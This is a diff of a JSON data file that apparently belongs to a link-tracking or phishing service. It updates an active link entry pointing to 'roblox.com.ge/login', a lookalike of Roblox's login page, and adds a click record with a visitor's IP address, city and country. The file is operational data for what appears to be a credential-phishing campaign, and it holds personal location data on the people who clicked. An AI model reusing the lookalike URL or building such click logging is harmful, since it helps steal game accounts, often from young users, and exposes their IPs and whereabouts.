@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1673,
+    "useCount": 1674,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13552,6 +13552,14 @@
         "city": "Zamboanga City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777619949490,
+        "ip": "171.100.237.224",
+        "country": "Thailand",
+        "city": "Chiang Mai",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
       }
     ]
   },
